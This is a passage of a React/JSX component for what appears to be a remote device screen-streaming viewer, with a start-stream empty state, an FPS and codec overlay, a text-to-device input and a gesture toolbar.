            <EmptyState
              icon={Monitor}
              title="No stream active"
              description='Click "Start" to begin'
              action={{ label: 'Start Stream', onClick: startStream, disabled: !canAct }}
            />
          )}

          {/* Stats overlay (top-right corner when streaming) */}
          {streaming && (
            <div className="absolute top-2 right-2 flex items-center gap-1.5 bg-black/60 rounded px-2 py-1 pointer-events-none">
              <span className="text-[10px] font-mono text-green-400">{measuredFps}fps</span>
              <span className="text-[10px] font-mono text-blue-300">{liveCodec.toUpperCase()}</span>
            </div>
          )}
        </div>

        {/* Text input overlay */}
        {streaming && showTextInput && (
          <div className="flex gap-2 px-3 py-2 bg-zinc-800/90 border-t border-zinc-700">
            <Input
              className="h-8 text-xs bg-zinc-900 border-zinc-600 text-white placeholder:text-zinc-500 flex-1"
              placeholder="Type text to send to device…"
              value={textInput}
              onChange={e => setTextInput(e.target.value)}
              onKeyDown={e => { if (e.key === 'Enter') { e.preventDefault(); sendText(); } }}
              autoFocus
            />
            <Button size="sm" onClick={sendText} disabled={!textInput} className="h-8 px-3 text-xs">Send</Button>
            <Button size="sm" variant="ghost" onClick={() => setShowTextInput(false)} className="h-8 px-2 text-zinc-400">✕</Button>
          </div>
        )}

        {/* Gesture toolbar — always visible when streaming */}
        {streaming && <GestureToolbar />}

        {/* Static hint bar when not streaming */}
        {!streaming && (
          <div className="px-4 py-2 bg-muted/50 border-t flex items-center gap-2 text-xs text-muted-foreground">
            <MousePointerClick className="h-3 w-3" />
            Tap · Drag · Long-press · Double-tap · Pinch — all supported
          </div>
        )}
      </div>
    </div>
  );
}
